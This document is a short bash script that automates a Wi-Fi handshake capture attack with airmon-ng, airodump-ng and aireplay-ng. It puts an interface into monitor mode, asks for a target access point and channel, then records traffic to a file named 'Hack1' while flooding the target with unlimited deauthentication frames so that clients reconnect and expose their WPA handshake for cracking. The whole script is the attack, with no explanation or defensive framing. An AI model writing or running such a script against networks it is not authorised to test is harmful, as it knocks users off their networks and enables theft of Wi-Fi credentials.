#!/bin/bash

# all handshake encryption
red="\e[0;91m"
blue="\e[0;94m"
reset="\e[0m"

echo ' '

read -p "[$(echo -e $blue"?"$reset)] Enter name interface : " Interface

airmon-ng start $Interface

MON=mon
airodump-ng $Interface$MON

echo ' '
read -p "[$(echo -e $blue"?"$reset)] Enter BSSID : " BSSID
read -p "[$(echo -e $blue"?"$reset)] Enter CHANNL : " CHANNL

airodump-ng $Interface$MON -d $BSSID -c $CHANNL

xterm -hold -e airodump-ng -w Hack1 -c $CHANNL --bssid $BSSID $Interface$MON & xterm -hold -e aireplay-ng --deauth 0 -a $BSSID $Interface$MON

airmon-ng stop $Interface$MON

